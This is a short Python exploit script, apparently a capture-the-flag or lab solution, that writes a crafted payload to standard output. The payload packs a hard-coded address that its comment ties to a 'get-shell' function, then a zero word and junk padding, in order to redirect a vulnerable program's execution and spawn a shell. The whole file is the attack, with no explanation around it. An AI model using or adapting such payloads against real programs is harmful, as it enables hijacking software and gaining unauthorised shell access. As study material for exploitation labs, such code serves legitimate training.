#!/usr/bin/python3 
import sys
import struct

def p32(x):
    return struct.pack("<I", x)

address = 0x00401568 # this address + 8 = address of get-shell function

payload = p32(address)
payload += p32(0x00000000)
payload += 3 * b'JUNK'

sys.stdout.buffer.write(payload)
